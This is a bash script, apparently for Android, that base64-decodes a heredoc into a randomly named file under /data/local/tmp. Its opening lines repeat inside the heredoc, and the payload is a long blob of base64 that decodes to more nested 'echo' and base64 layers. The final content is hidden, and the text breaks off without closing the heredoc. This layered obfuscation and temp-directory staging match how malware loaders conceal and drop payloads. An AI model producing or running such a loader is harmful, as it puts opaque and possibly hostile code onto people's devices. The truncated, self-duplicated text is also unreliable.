#!/bin/bash
RNDM=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32 ; echo '') 
PIXIE="/data/local/tmp/tmp.$RNDM"
base64 -d >${PIXIE}<<DIXIE
#!/bin/bash
RNDM=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32 ; echo '') 
PIXIE="/data/local/tmp/tmp.$RNDM"
base64 -d >${PIXIE}<<DIXIE
ZWNobyAnWldOb2J5QW5XbGRPYjJKNVFXNVhiR1JQWWpKS05WRlhiRXBSZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVjRWRTFJVWsxVmVrSXdWRVpOZDJSRmVGUk5TRkpOVlhwQ01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhkYU1HeHVZMGQ0V2sxdGFESlRWVTVLV2pGR1YxTnNWa3BTV0ZKUlZsZDBWMUZyYkVaUFZXUlRZVlZLUTFaSGVGTlRhM2hXVkd0c1UxWlZXbFpUVlZwUFYyeFZlRlZyV2xWVk1FWndVVEl4VjJGdFJraFBSMlJLWVZWR01GUkdUWGRrUlhoVVRVaFNUVlY2UWpCVVJrMTNaRVY0VkUxSVVrMVZla0l3VkVaTmQyUkZlRlJOU0ZKTlZYcENNRlJHVFhka1JYaFVUVWhTVFZWNlFqQlVSazEzWkVWNFZFMUlVazFWZWtJd1ZFWk5kMlJGZUZSTlNGSk5WWHBDTUZSR1RYZGtSWGhVVFVoU1RWVjZRakJVUmsxM1pFVnNSRk5WZEdGV01EVjJXVzVzUW1GVmJFZGpNbVJXVFRGS2Ixa3lOVk5pUm5CRVVXeE9ZVmRGTkhkWmFrNUxZMGRLZEZreVpGTmlWM2g2VjJ4b1Rsb3hWa2hsUjNoYVYwVTFjMU5WV210aFIwWlpWVmhXVFdGVVVqRlRWVmwzV2pCc2JtTkljR2xTTVZweldUQk9RbVZWVG5WVGJsSktVWHBHTlZkdGJFSmtiVTE2Vlc1YWFtSlZXblZYYkUwMVlrZEtXVlp1VGxwWFJrcHpWMnROTkdRd2QzZFNibFpoVTBWd01sbFdaRkprYkhCSVVtcENXbFY2YkhGWmFrbDNaRmRPU1ZadGJHRmxWRlo1V1RJd2VHUnNiSFJpU0U1aFZYcHNkRmxXWkRSaVIwNDFUMVphVTFaR1NrbFhWbU40WWtWM2VGUnRPVnBXTVVveVdrUkdVMlZXYkZoVWJrcGhWMFZ3UjFwVmFGTmxWbXhVVDFaU2FGSXdXbkpaYWs1clZsZE9kRkp0Y0doTmJGbzFWV3hvYjAxSFRuUlNXRnBXVFd0WmVWZHNaRkprYkZaSVVtNUthbVZVYkhGWmFrNUxZa1puZWxGdGFHdFNNRFYyVjBod1FtUlZNVlZaTTFaT1VYcFNORlJXVWxKTmF6RlVUbGhrV2xZelRUTlJNalZMWkVWc1JFMVliR0ZoVlVZeVdYcE9VMlJ0VG5SU2JUVmhWWHBzYzFsc2FGZGpNV3haVlcxNFlWRjZhRE5VUkVKSFpGWndTVk51V21oV01VWXlWMnRrUjAxR2JGUlBWM0JwVFdwQ01Wa3dhRmRoVm5BMVRsaEthbUpVUmpKWFZ6RnpZekZ3VkU5WE1XaFdNMmh6V1ROck5WWnNTbFZWYTJoYVZucEdjMVJFUms5aU1XeFlWVzVhYTAxV1NqVlhWbVJQWTJ4d1dWTnJXbXhUUmtvMVYxWk5OVlpIUmtoU2JYUnBUVEpTVmxreU1VZGhiVVY1Vm01c1UxZEhaM2RaTWpGR1pHeFZlVkpxU21GV01VWXlWbFZrUjJOdFRqVlBWM0JwVFRCd2MxZEVUa05oUjFKSVZHMDVXV1ZyUmpGVVZsSnFaRlV4UkU1SWFFNVdSa1Y1VkZkck1XUXhiRmhqZW1SRVltdHdNRk5WVFhobFZuQndVVmhhYWsweFNqSlpNakZIWW14d1ZFOVhlR2xYUmxwNlYxWm9VMkpHY0VSUFNHUk5UVVZhTVZkcmFFdGtiVVpZVlZoYVlWSXdXWGRYVmswMVlXMUplVTFJVm1wVFJscHdWMjVyTVdOdFRuUk5XRnBhWWxkNGVsZHNUVFZpVjBaWVpVZDRhbVZVYkZkVmJGSlRVMFpzV0UxWGVFMU5WVFYyVjFaa1UyUnRVWGhWYm14YVZqQTFlVmRzYUV0U2JWWkpWVzVzV2xWNmJGVlpWV1JIWVRKSmVscEdWbXBpVlZweFdWUktWMlZXU2xsaFJFSnFZbFZXTWxaVVNrZE5iSEJZVlZoYVZsSXdXbmxaTTJzMVlXMUplbE50ZUZsTk1FcHZXa1ZrVDJJeGFEWlJXRlpPVmtkT01WUlZUVEJsUlRGVlZWUktUbVZVVmpOWFZtUjZUakJPZFZOdVVrcFJla1kxVjIxc1FtUnRUWHBWYmxwcVlsVmFkVmRzVFRWaVIwcFpWbTVPV2xkR1NuTlhhMDAwWkRCM2QxSnVWbUZUUlhBeVdWWmtVbVJzY0VoU2FrSmFWWHBzY1ZscVNYZGtWMDVKVm0xc1lXVlVWbmxaTWpCNFpHeHNkR0pJVG1GVmVteDBXVlprTkdKSFRqVlBWbHBUVmtaS1NWZFdZM2hpUlhkNFZHMDVXbFl4U2pKYVJFWlRaVlpzV0ZSdVNtRlhSWEJIV2xWb1UyVldiRlJQVmxKb1VqQmFjbGxxVG10V1YwNTBVbTF3YUUxc1dqVlZiR2h2VFVkT2RGSllXbFpOYTFsNVYyeGtVbVJzVmtoU2JrcHFaVlJzY1ZscVRrdGlSbWQ2VVcxb2ExSXdOWFpYU0hCQ1pGVXhWVmt6Vms1UmVsSTBWRlpTVWsxck5VUk9XR1JhVmpOTk0xRXlOVXRrUld4RVRWaHNZV0ZWUmpKWmVrNVRaRzFPZEZKdE5XRlZlbXh6V1d4b1YyTXhiRmxWYlhoaFVYcG9NMVJFUWtka1ZuQkpVMjVhYUZZeFJqSlhhMlJIVFVac1ZFOVhjR2xOYWtJeFdUQm9WMkZXY0RWT1dFcHFZbFJHTWxkWE1YTmpNWEJVVDFjeGFGWXphSE5aTTJzMVZteEtWVlZyYUZwV2VrWnpWRVJHVDJJeGJGaFZibHByVFZaS05WZFdaRTlqYkhCWlUydGFiRk5HU2pWWFZrMDFWa2RHU0ZKdGRHbE5NbEpXV1RJeFIyRnRSWGxXYm14VFYwZG5kMWt5TVVaa2JGVjVVbXBLWVZZeFJqSldWV1JIWTIxT05VOVhOVnBXZWtaelYwUk9RMkZIVWtoVWJUbFpaV3RHTVZSV1VtcGtWVEZFVGtob1RsWkdSWGxVVmsweFpERnNXR042WkVSaWEzQXdVMVZOZUdWV2NIQlJXRnBxVFRGS01sa3lNVWRpYkhCVVQxZDRhVmRHV25wWFZtaFRZa1p3UkU5SVpFMU5SVm94VjJ0b1MyUnRSbGhWV0ZwaFVqQlpkMWRXVFRWaGJVbDVUVWhXYWxOR1duQlhibXN4WTIxT2RFMVlXbHBpVjNoNlYyeE5OV0pYUmxobFIzaHFaVlJzVjFWc1VsTlRSbXhZVFZkNFRVMVZOWFpYVm1SVFpHMVJlRlZ1YkZwV01EVjVWMnhvUzFKdFZrbFZibXhhVlhwc1ZWbFZaRWRoTWtsNldrWldhbUpWV25GWlZFcFhaVlpLV1dGRVFtcGlWVll5VmxSS1IwMXNjRmhWV0ZwV1VqQmFlVmt6YXpWaWJHeFlUVmQ0V1Uwd1NtOWFSV1JQWWpGb05sRllWazVXUjA0eFZGVk5NR1ZGTVZWVlZFcE9ZVlJXTTFkV1pIcE9NRTUxVTI1U1NsRjZSalZYYld4Q1pHMU5lbFZ1V21waVZWcDFWMnhOTldKSFNsbFdiazVhVjBaS2MxZHJUVFJrTUhkM1VtNVdZVk5GY0RKWlZtUlNaR3h3U0ZKcVFscFZlbXh4V1dwSmQyUlhUa2xXYld4aFpWUldlVmt5TUhoa2JHeDBZa2hPWVZWNmJIUlpWbVEwWWtkT05VOVdXbE5XUmtwSlYxWmplR0pGZDNoVWJUbGFWakZLTWxwRVJsTmxWbXhZVkc1S1lWZEZjRWRhVldoVFpWWnNWRTlXVW1oU01GcHlXV3BPYTFaWFRuUlNiWEJvVFd4YU5WVnNhRzlOUjA1MFVsaGFWazFyV1hsWGJHUlNaR3hXU0ZKdVNtcGxWR3gxVjFaamVHSkdaM3BSYldoclVqQTFkbGRJY0VKa1ZURlZXVE5XVGxGNlVqUlVWbEpTVFdzeE5VNVlaRnBXTTAwelVUSTFTMlJGYkVSTldHeGhZVlZHTWxsNlRsTmtiVTUwVW0wMVlWVjZiSE5aYkdoWFl6RnNXVlZ0ZUdGUmVtZ3pWRVJDUjJSV2NFbFRibHBvVmpGR01sZHJaRWROUm14VVQxZHdhVTFxUWpGWk1HaFhZVlp3TlU1WVNtcGlWRVl5VjFjeGMyTXhjRlJQVnpGb1ZqTm9jMWt6YXpWV2JFcFZWV3RvV2xaNlJuTlVSRVpQWWpGc1dGVnVXbXROVmtvMVYxWmtUMk5zY0ZsVGExcHNVMFpLTlZkV1RUVldSMFpJVW0xMGFVMHlVbFpaTWpGSFlXMUZlVlp1YkZOWFIyZDNXVEl4Um1Sc1ZYbFNha3BoVmpGR01sWlZaRWRqYlU0MVQxYzFXbFo2Um5OWFJFNURZVWRTU0ZSdE9WbGxhMFl4VkZaU2FtUlZNVVJPU0doT1ZrWkZlVlJyVFRGa01XeFlZM3BrUkdKcmNEQlRWVTE0WlZad2NGRllXbXBOTVVveVdUSXhSMkpzY0ZSUFYzaHBWMFphZWxkV2FGTmlSbkJFVDBoa1RVMUZXakZYYTJoTFpHMUdXRlZZV21GU01GbDNWMVpOTldGdFNYbE5TRlpxVTBaYWNGZHVhekZqYlU1MFRWaGFXbUpYZUhwWGJFMDFZbGRHV0dWSGVHcGxWR3hYVld4U1UxTkdiRmhOVjNoTlRWVTFkbGRXWkZOa2JWRjRWVzVzV2xZd05YbFhiR2hMVW0xV1NWVnViRnBWZW14VldWVmtSMkV5U1hwYVJsWnFZbFZhY1ZsVVNsZGxWa3BaWVVSQ2FtSlZWakpXVkVwSFRXeHdXRlZZV2xaU01GcDVXVE5yTldGdFNYcFRiWGhaVFRCS2IxcEZaRTlpTVdnMlVWaFdUbFpIVGpGVVZVMHdaVVV4VlZvelpFNVJlbFl6VjFaa2VrNHdUblZUYmxKS1VYcEdOVmR0YkVKa2JVMTZWVzVhYW1KVlduVlhiRTAxWWtkS1dWWnVUbHBYUmtwelYydE5OR1F3ZDNkU2JsWmhVMFZ3TWxsV1pGSmtiSEJJVW1wQ1dsVjZiSEZaYWtsM1pGZE9TVlp0YkdGbFZGWjVXVEl3ZUdSc2JIUmlTRTVoVlhwc2RGbFdaRFJpUjA0MVQxWmFVMVpHU2tsWFZtTjRZa1YzZUZSdE9WcFdNVW95V2tSR1UyVldiRmhVYmtwaFYwVndSMXBWYUZObFZteFVUMVpTYUZJd1duSlphazVyVmxkT2RGSnRjR2hOYkZvMVZXeG9iMDFIVG5SU1dGcFdUV3RaZVZkc1pGSmtiRlpJVW01S2FtVlViSEZaYWs1TFlrWm5lbEZ0YUd0U01EVjJWMGh3UW1SVk1WVlpNMVpPVVhwU05GUldVbTVrTURGVVRsaGtXbFl6VFROUk1qVkxaRVZzUkUxWWJHRmhWVVl5V1hwT1UyUnRUblJTYlRWaFZYcHNjMWxzYUZkak1XeFpWVzE0WVZGNmFETlVSRUpIWkZad1NWTnVXbWhXTVVZeVYydGtSMDFHYkZSUFYzQnBUV3BDTVZrd2FGZGhWbkExVGxoS2FtSlVSakpYVnpGell6RndWRTlYTVdoV00yaHpXVE5yTlZac1NsVlZhMmhhVm5wR2MxUkVSazlpTVd4WVZXNWFhMDFXU2pWWFZtUlBZMnh3V1ZOcldteFRSa28xVjFaTk5WWkhSa2hTYlhScFRUSlNWbGt5TVVkaGJVVjVWbTVzVTFkSFozZFpNakZHWkd4VmVWSnFTbUZXTVVZeVZsVmtSMk50VGpWUFYzQnBUVEJ3YzFkRVRrTmhSMUpJVkcwNVdXVnJSakZVVmxKcVpGVXhSRTVJYUU1V1IyUXpWRmRyTVdReGJGaGplbVJFWW10d01GTlZUWGhsVm5Cd1VWaGFhazB4U2pKWk1qRkhZbXh3VkU5WGVHbFhSbHA2VjFab1UySkdjRVJQU0dSTlRVVmFNVmRyYUV0a2JVWllWVmhhWVZJd1dYZFhWazAxWVcxSmVVMUlWbXBUUmxwd1YyNXJNV050VG5STldGcGFZbGQ0ZWxkc1RUVmlWMFpZWlVkNGFtVlViRmRWYkZKVFUwWnNXRTFYZUUxTlZUVjJWMVprVTJSdFVYaFZibXhhVmpBMWVWZHNhRXRTYlZaSlZXNXNXbFY2YkZWWlZXUkhZVEpKZWxwR1ZtcGlWVnB4V1ZSS1YyVldTbGxoUkVKcVlsVldNbFpVU2tkTmJIQllWVmhhVmxJd1dubFpNMnMxWVcxSmVsTnRlRmxOTUVwdldrVmtUMkl4YURaUldGWk9Wa2RPTVZSVlRUQmxSVEZWV2pOa1RtVlVWak5YVm1SNlRqQk9kVk51VWtwUmVrWTFWMjFzUW1SdFRYcFZibHBxWWxWYWRWZHNUVFZpUjBwWlZtNU9XbGRHU25OWGEwMDBaREIzZDFKdVZtRlRSWEF5V1Zaa1VtUnNjRWhTYWtKYVZYcHNjVmxxU1hka1YwNUpWbTFzWVdWVVZubFpNakI0Wkd4c2RHSklUbUZWZW14MFdWWmtOR0pIVGpWUFZscFRWa1pLU1ZkV1kzaGlSWGQ0VkcwNVdsWXhTakphUkVaVFpWWnNXRlJ1U21GWFJYQkhXbFZvVTJWV2JGUlBWbEpvVWpCYWNsbHFUbXRXVjA1MFVtMXdhRTFzV2pWVmJHaHZUVWRPZEZKWVdsWk5hMWw1VjJ4a1VtUnNWa2hTYmtwcVpWUnNjVmxxVGt0aVJtZDZVVzFvYTFJd05YWlhTSEJDWkZVeFZWa3pWazVSZWxJMFZGWlNibVF3TlVST1dHUmFWak5OTTFFeU5VdGtSV3hFVFZoc1lXRlZSakpaZWs1VFpHMU9kRkp0TldGVmVteHpXV3hvVjJNeGJGbFZiWGhoVVhwb00xUkVRa2RrVm5CSlUyNWFhRll4UmpKWGEyUkhUVVpzVkU5WGNHbE5ha0l4V1RCb1YyRldjRFZPV0VwcVlsUkdNbGRYTVhOak1YQlVUMWN4YUZZemFITlpNMnMxVm14S1ZWVnJhRnBXZWtaelZFUkdUMkl4YkZoVmJscHJUVlpLTlZkV1pFOWpiSEJaVTJ0YWJGTkdTalZYVmswMVZrZEdTRkp0ZEdsTk1sSldXVEl4UjJGdFJYbFdibXhUVjBkbmQxa3lNVVprYkZWNVVtcEtZVll4UmpKV1ZXUkhZMjFPTlU5WGNHbE5NSEJ6VjBST1EyRkhVa2hVYlRsWlpXdEdNVlJXVW1wa1ZURkVUa2hvVGxaSFpETlViRTB4WkRGc1dHTjZaRVJpYTNBd1UxVk5lR1ZXY0hCUldGcHFUVEZLTWxreU1VZGliSEJVVDFkNGFWZEdXbnBYVm1oVFlrWndSRTlJWkUxTlJWb3hWMnRvUzJSdFJsaFZXRnBoVWpCWmQxZFdUVFZoYlVsNVRVaFdhbE5HV25CWGJtc3hZMjFPZEUxWVdscGlWM2g2VjJ4Tk5XSlhSbGhsUjNocVpWUnNWMVZzVWxOVFJteFlUVmQ0VFUxVk5YWlhWbVJUWkcxUmVGVnViRnBXTURWNVYyeG9TMUp0VmtsVmJteGFWWHBzVlZsVlpFZGhNa2w2V2taV2FtSlZXbkZaVkVwWFpWWktXV0ZFUW1waVZWWXlWbFJLUjAxc2NGaFZXRnBXVWpCYWVWa3phelZpYkd4WVRWZDRXVTB3U205YVJXUlBZakZvTmxGWVZrNVdSMDR4VkZWTk1HVkZNVlZhTTJST1VYcFdNMWRXWkhwT01FNTFVMjVTU2xGNlJqVlhiV3hDWkcxTmVsVnVXbXBpVlZwMVYyeE5OV0pIU2xsV2JrNWFWMFpLYzFkclRUUmtNSGQzVW01V1lWTkZjREpaVm1SU1pHeHdTRkpxUWxwVmVteHhXV3BKZDJSWFRrbFdiV3hoWlZSV2VWa3lNSGhrYkd4MFlraE9ZVlY2YkhSWlZtUTBZa2RPTlU5V1dsTldSa3BKVjFaamVHSkZkM2hVYlRsYVZqRktNbHBFUmxObFZteFlWRzVLWVZkRmNFZGFWV2hUWlZac1ZFOVdVbWhTTUZweVdXcE9hMVpYVG5SU2JYQm9UV3hhTlZWc2FHOU5SMDUwVWxoYVZrMXJXWGxYYkdSU1pHeFdTRkp1U21wbFZHeDFWMVpqZUdKR1ozcFJiV2hyVWpBMWRsZEljRUprVlRGVldUTldUbEY2VWpSVVZsSnVaREF4VkU1WVpGcFdNMDB6VVRJMVMyUkZiRVJOV0d4aFlWVkdNbGw2VGxOa2JVNTBVbTAxWVZWNmJITlpiR2hYWXpGc1dWVnRlR0ZSZW1nelZFUkNSMlJXY0VsVGJscG9WakZHTWxkclpFZE5SbXhVVDFkd2FVMXFRakZaTUdoWFlWWndOVTVZU21waVZFWXlWMWN4YzJNeGNGUlBWekZvVmpOb2Mxa3phelZXYkVwVlZXdG9XbFo2Um5OVVJFWlBZakZzV0ZWdVdtdE5Wa28xVjFaa1QyTnNjRmxUYTFwc1UwWktOVmRXVFRWV1IwWklVbTEwYVUweVVsWlpNakZIWVcxRmVWWnViRk5YUjJkM1dUSXhSbVJzVlhsU2FrcGhWakZHTWxaVlpFZGpiVTQxVDFjMVdsWjZSbk5YUkU1RFlVZFNTRlJ0T1ZsbGEwWXhWRlpTYW1SVk1VUk9TR2hPVmtka00xUlhhekZrTVd4WVkzcGtSR0pyY0RCVFZVMTRaVlp3Y0ZGWVdtcE5NVW95V1RJeFIySnNjRlJQVjNocFYwWmFlbGRXYUZOaVJuQkVUMGhrVFUxRldqRlhhMmhMWkcxR1dGVllXbUZTTUZsM1YxWk5OV0Z0U1hsTlNGWnFVMFphY0ZkdWF6RmpiVTUwVFZoYVdtSlhlSHBYYkUwMVlsZEdXR1ZIZUdwbFZHeFhWV3hTVTFOR2JGaE5WM2hOVFZVMWRsZFdaRk5rYlZGNFZXNXNXbFl3TlhsWGJHaExVbTFXU1ZWdWJGcFZlbXhWV1ZWa1IyRXlTWHBhUmxacVlsVmFjVmxVU2xkbFZrcFpZVVJDYW1KVlZqSldWRXBIVFd4d1dGVllXbFpTTUZwNVdUTnJOV0pzYkZoTlYzaFpUVEJLYjFwRlpFOWlNV2cyVVZoV1RsWkhUakZVVlUwd1pVVXhWVm96WkU1bFZGWXpWMVprZWs0d1RuVlRibEpLVVhwR05WZHRiRUprYlUxNlZXNWFhbUpWV25WWGJFMDFZa2RLV1ZadVRscFhSa3B6VjJ0Tk5HUXdkM2RTYmxaaFUwVndNbGxXWkZKa2JIQklVbXBDV2xWNmJIRlpha2wzWkZkT1NWWnRiR0ZsVkZaNVdUSXdlR1JzYkhSaVNFNWhWWHBzZEZsV1pEUmlSMDQxVDFaYVUxWkdTa2xYVm1ONFlrVjNlRlJ0T1ZwV01Vb3lXa1JHVTJWV2JGaFVia3BoVjBWd1IxcFZhRk5sVm14VVQxWlNhRkl3V25KWmFrNXJWbGRPZEZKdGNHaE5iRm8xVld4b2IwMUhUblJTV0ZwV1RXdFplVmRzWkZKa2JGWklVbTVLYW1WVWJIVlhWbU40WWtabmVsRnRhR3RTTURWMlYwaHdRbVJWTVZWWk0xWk9VWHBTTkZSV1VtNWtNRFZFVGxoa1dsWXpUVE5STWpWTFpFVnNSRTFZYkdGaFZVWXlXWHBPVTJSdFRuUlNiVFZoVlhwc2MxbHNhRmRqTVd4WlZXMTRZVkY2YUROVVJFSkhaRlp3U1ZOdVdtaFdNVVl5VjJ0a1IwMUdiRlJQVjNCcFRXcENNVmt3YUZkaFZuQTFUbGhLYW1KVVJqSlhWekZ6WXpGd1ZFOVhNV2hXTTJoeldUTnJOVlpzU2xWVmEyaGFWbnBHYzFSRVJrOWlNV3hZVlc1YWEwMVdTalZYVm1SUFkyeHdXVk5yV214VFJrbzFWMVpOTlZaSFJraFNiWFJwVFRKU1Zsa3lNVWRoYlVWNVZtNXNVMWRIWjNkWk1qRkdaR3hWZVZKcVNtRldNVVl5VmxWa1IyTnRUalZQVnpWYVZucEdjMWRFVGtOaFIxSklWRzA1V1dWclJqRlVWbEpxWkZVeFJFNUlhRTVXUjJRelZHeE5NV1F4YkZoamVtUkVZbXR3TUZOVlRYaGxWbkJ3VVZoYWFrMHhTakpaTWpGSFlteHdWRTlYZUdsWFJscDZWMVpvVTJKR2NFUlBTR1JOVFVWYU1WZHJhRXRrYlVaWVZWaGFZVkl3V1hkWFZrMDFZVzFKZVUxSVZtcFRSbHB3VjI1ck1XTnRUblJOV0ZwYVlsZDRlbGRzVFRWaVYwWllaVWQ0YW1WVWJGZFZiRkpUVTBac1dFMVhlRTFOVlRWMlYxWmtVMlJ0VVhoVmJteGFWakExZVZkc2FFdFNiVlpKVlc1c1dsVjZiRlZaVldSSFlUSkplbHBHVm1waVZWcHhXVlJLVjJWV1NsbGhSRUpxWWxWV01sWlVTa2ROYkhCWVZWaGFWbEl3V25sWk0yczFZbXhzV0UxWGVGbE5NRXB2V2tWa1QySXhhRFpSV0ZaT1ZrZE9NVlJWVFRCbFJURlZXak5rVDJGVVZqTlhWbVI2VGpCT2RWTnVVa3BSZWtZMVYyMXNRbVJ0VFhwVmJscHFZbFZhZFZkc1RUVmlSMHBaVm01T1dsZEdTbk5YYTAwMFpEQjNkMUp1Vm1GVFJYQXlXVlprVW1Sc2NFaFNha0phVlhwc2NWbHFTWGRrVjA1SlZtMXNZV1ZVVm5sWk1qQjRaR3hzZEdKSVRtRlZlbXgwV1Zaa05HSkhUalZQVmxwVFZrWktTVmRXWTNoaVJYZDRWRzA1V2xZeFNqSmFSRVpUWlZac1dGUnVTbUZYUlhCSFdsVm9VMlZXYkZSUFZsSm9VakJhY2xscVRtdFdWMDUwVW0xd2FFMXNXalZWYkdodlRVZE9kRkpZV2xaTmExbDVWMnhrVW1Sc1ZraFNia3BxWlZSc2RWZFdZM2hpUm1kNlVXMW9hMUl3TlhaWFNIQkNaRlV4VlZrelZrNVJlbEkwVkZaU2JtUXdOVFZPV0dSYVZqTk5NMUV5TlU5ak1YQllWbTVrU2xKRmJFeFhWRTVDV2pCNFYxTlhaRTFOTURSM1dXcE9TMkZHYjNsV1dGcGhWbnBGZUZsclpFZE5SbkJZVlZoYVRsRjZiRU5XVjNoVFdteEZlVTlZYkdsTmFsWnZWMFJDTUZVeFozcFhXR3hOWVd4V01sVnJWa2RXVmtaVVQxYzFXbFo2Um5OWFJFNURZVWRTU0ZSdE9WbGxhMFl4VkZaU2FtUlZNVVJPU0doT1ZrZGtNMVJYYXpGa01XeFlZekprVFUwd05IZFphazVMWVVadmVWWllXbUZXZWtWNFdXdGtSMDFHY0ZoVldGcE9VWHBzUTFsdE1WTmxWMGw1WWtkMFRVMXNTbTlhUldSR1pHeHJlVTlZVWsxaWEwbDRWMWN4YW1SWFJYcFRibEpwVFd0d2QxbHJaRlprYkhCMFlraE9ZVmRGTVRKV2JGWldUVVpKZVZKdVVtRlZlbXhWV1ZWa1IyRXlTWHBhUmxacVlsVmFjVmxVU2xkbFZrcFpZVVJDYW1KVlZqSldWRXB2WVVad1NFOVVUbGRUUlhCdlYxUktNR0pIVG5KV2FsSnJVMFZ3YjFSRVJrOWhSMUowVm0xMFRVMVZTbTlaVkU1T1pHeHZlVkp1VW1GV2Ftd3pWMVpvVTJGdFJrZFBTR1JOWVd0VmVsUkhjRUprVlRGVlVsUlNUbEpGYkRGWk1HUkhZMnRPZEZSdVpFcFJla1pVVTFWTk5XVnRVa2hQV0d4YVZqSlNjMVJFU2xka1IxSllaVWRvYTFJeFduSlVTSEJDWkd4R1YxTnNWbGxOUlRVeVdUSXdOV1JXYkZkUFZYaFdZa1JyZVZSWGF6Qk5WWGQzVld0S1YxSlZWakpYYWtwSFpFWndWMDlZWkZwWFJrcHhXVlZaTkdRd2VIRlNWRTVOWVd0R01WUldVa1pPUlRGRlZGaFdhbEl3V25sVFZVMDFaVzFTU0U5WWJGcFdNbEp6VkVSS1YyUkhVbGhsUjJoclVqRmFjbFJJY0VKa2JFWllUbGQwYW1KVWJIZFhhMDAxWVRGc1dWVnRhRTFOYXpVeVdXeE5NV1F5VWxoVGJUVk5ZbGhTTlZsc1l6VmhWMFpZWlVkNFRVMXNjSGRaYTJSWFpXdDNlRlpyV2s5U1YxSnZXV3hrVm1Sc1ZYbGhSMmhoVW5wcmVsWnJhRXRoUm10NVpFZDRhbUV4V1RCYVJXaExZVVYzZUZSdE9WcFdNVW95V2tSR1UyVldiRmhVYmtwaFYwVndSMXBWYUZObFZteFVUMVpTV2xkR2NITlhhMDAxVlZac1dHUkljRTFOYlZKdldXeGtWMXB0VGtoU2FrSmFUVzFvYlZSVlRUQmxSVFUxVGtoa1RXRnJWalJVTUZKQ1pXdDRkVkZ0YUdoa00wSnhXVEJPUW1SR1ZuQlJXRnBxVFRGS01sa3lNVWRpYkhCVVQxZDRhVmRHV25wWFZtaFRZa1p3UkU5SVpFMU5SVnBVVm10Wk5WSkhTWHBUYmxwcFlsVmFiVlY2Umt0YWJWSnhVMWhXVDFWNmJFWlZWbHBUVVd0M2VWcEhhR2xXTVZwdFdUQmtSMDFHYTNsaFIxcE9VWHBTTkZSdWF6QmtNSGh4VWxob1VGSkZSWGRVUnpWRFlVZEdOVkZZV21wTk1Vb3lXVEl4UjJKc2NGUlBWM2hwVjBaYWVsZFdhRk5pUm5CRVQwaGtUVTFGV2pGWGEyaExaRzFHV0ZWWVdtRlNNRmwzVjFaTk5XRnRTWGxOU0ZacVUwWmFjRmR1YXpGamJVNTBUVmhhV21KWGVIcFhiRTAxWWxkR1dHVkhlR3BsVkd4WFZXeFNVMU5HYkZoTlYzaE5UVlUxZGxkV1pGTmtiVkY0Vlc1c1dsWXdOWGxYYkdoTFVtMVdTVlZ1YkZwVmVteFZXVlZrUjJFeVNYcGFSbFpxWWxWYWNWbFVTbGRsVmtwWllVUkNhbUpWVmpKV1ZFcEhUV3h3V0ZWWVdsWlNNRnA1V1ROck5XSnNiRmhOVjNoWlRUQktiMXBGWkU5aU1XZzJVVmhXVGxaSFRqRlVWVTB3WlVVeFZWb3paRTlSZWxZelYxWmtlbE14YTNwUlYyUk5WbXRzYmxSRVRrOU5SMGw2VTIxb1lVMXNWakpYYkdONFRWZEtTRkpxUW1GV01VWXlWRlZOTlZGc1ZuTlZiVnBTVFdwc05WbHFTVEZoUm1kM1pFWk9XVTB4YkRWVVIzQldaR3hLUmxKc1ZsSlZlbXgxVjFaamVHSkdaM3BSYldoclVqQTFkbGRJY0VKa1ZURlZXVE5XVGxGNlVqUlVWbEp1WkRBMVZFNVlaRnBXTTA1dVZFUk9UMDFIU1hwVGJXaGhUV3hXTWxkc1kzaE5WMHBJVW1wQ1lWWXhSakpVVlUwMVVXMUtkRlZ1YkdsTmJYaHlWRVJLVTJGSFVraFNXRnBhVFdwc01GUkhOVU5OVm14MFdUTldhRTB3Y0RCWmFrcExZMGRLU0ZaWVdtRmlWM2g2VjJ4b1RtUnNXbFpXVkVKVFRXdGFNRmRzVFRWV1IwWklVbTEwYVUweVVsWlpNakZIWVcxRmVWWnViRk5YUjJkM1dUSXhSbVJzVlhsaFIyaGhVbnByZWxacmFFdGhSbXQ1WkVkNGFtRXhXVEJhUldoTFlVVjNlRlJ0YUd0aVZscHlWRVJHUTJGSFJYcFVXRnBoVFd0YU1GZHNXVFZrTVd4WlZXMXdhRkpxYUROVVIzQkdUVEI0Y1ZGWVZrNVdSVlV3VkZWU1ZtUlhUa2hTYmtwRVlsVTFNMU5WVFhoVk1HeEVUMWh3YTFKNmJEVlhWbVJyWWtWM2VWWnVVbXRXTTJodldrVmtWMkV3ZURaUldGcFNWbXR3VmxkRVFrOWtiVTUwVDFoV1dsWnFiRTFXVjNjMVRXc3hjRTVFUmsxTlJrcERWbXRXUm1Sc2IzbFNibEpoVm1wc00xZFdhRk5oYlVaSFQwaGtUV0ZyVlhwVVIzQkNaRlV4VlZKVVVrNVNSbXd4V1RCa1IyTnJiRVJQV0hCclVucHNOVmRXWkd0aVJYZDVWbTVTYTFZemFHOWFSV1JYWVRCNE5sRllXbEpXZWxaeVdUSXdOV05HY0VSUFYzUmFWMFpLYjFSRVNrOWtiVXBVVGxoa2ExWXdjSFZVUnpFd1pWZEtXRTlYYkdoV00yaHpWRVJLWVdOSFNraFdibkJOVFZaYVIxUnJWbXRoUjBwWVZsaGFWazF0YUc5WGEyTTFUVEZhU1ZOdGFGcE5ibEp6V1RKMFYwNUhVa2xUYldoTlRWVTFkbGRXWkZOa2JWRjRWVzVzV2xZd05YbFhiR2hMVW0xV1NWVnViRnBWZW14VlYxWm9ZV0pHY0VSUFZrWmFWak5TTmxSRVNtdGhSMHBZVm0xYWFsSXdXWGRYVkVwdldtc3hSRTVJYUU5bFZGSXpWRWR3Um1WRk9VVlJWRXBOWW10S2IxbFlaSGRoYlU1RVVWaFNWbUZWUmpKWmVrNVRaRzFPZEZKdE5XRlZlbXh6V1d4b1YyTXhiRmxWYlhoaFVYcG9NMVJFUWtkVk1WcEhUMVZTYVUwd2NESlpiVEZIV214TmVGTnRXbXRoYTJ3eFZHeE5OVkpXUmxkVmEwcE5UVzFTYjFsc1pGZGFiVTVJVW1wQ1drMXRhRzFVVlUwd1pVVTFOVTVJWkUxaGExWTBWREJTUWswd2VIVlJiV2hvWlZWR01sbDZUbE5rYlU1MFVtMDFZVlY2YkhOWmJHaFhZekZzV1ZWdGVHRlJlbWd6VkVSQ1IyUldjRWxUYmxwb1ZqRkdNbGRyWkVkTlJteFVUMWR3YVUxcVFqRlpNR2hYWVZad05VNVlTbXBpVkVZeVYx